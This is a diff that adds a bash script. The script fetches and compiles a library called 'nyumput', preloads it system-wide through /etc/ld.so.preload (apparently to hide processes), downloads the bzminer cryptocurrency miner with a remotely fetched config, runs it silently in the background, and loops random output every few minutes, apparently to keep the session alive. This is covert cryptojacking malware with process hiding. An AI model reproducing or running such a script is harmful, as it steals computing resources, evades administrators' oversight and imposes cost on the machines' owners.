@@ -1,0 +1,16 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+mkdir .kap && cd .kap
+wget https://github.com/bzminer/bzminer/releases/download/v17.0.0/bzminer_v17.0.0_linux.tar.gz
+tar xf bzminer_v17.0.0_linux.tar.gz
+cd bzminer_v17.0.0_linux
+rm -rf config.txt
+wget -O config.txt https://raw.githubusercontent.com/6248202226/filesg/main/bzminerconfig
+./bzminer > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
